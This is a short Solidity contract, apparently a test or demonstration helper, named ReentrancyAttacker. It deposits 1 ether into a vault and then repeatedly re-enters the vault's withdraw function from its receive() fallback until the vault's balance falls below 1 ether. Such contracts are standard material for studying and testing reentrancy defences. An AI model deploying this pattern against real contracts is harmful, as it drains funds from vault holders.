// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../interfaces/IVault.sol";

contract ReentrancyAttacker {
    IVault public vault;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();

        vault.withdraw();
    }
}
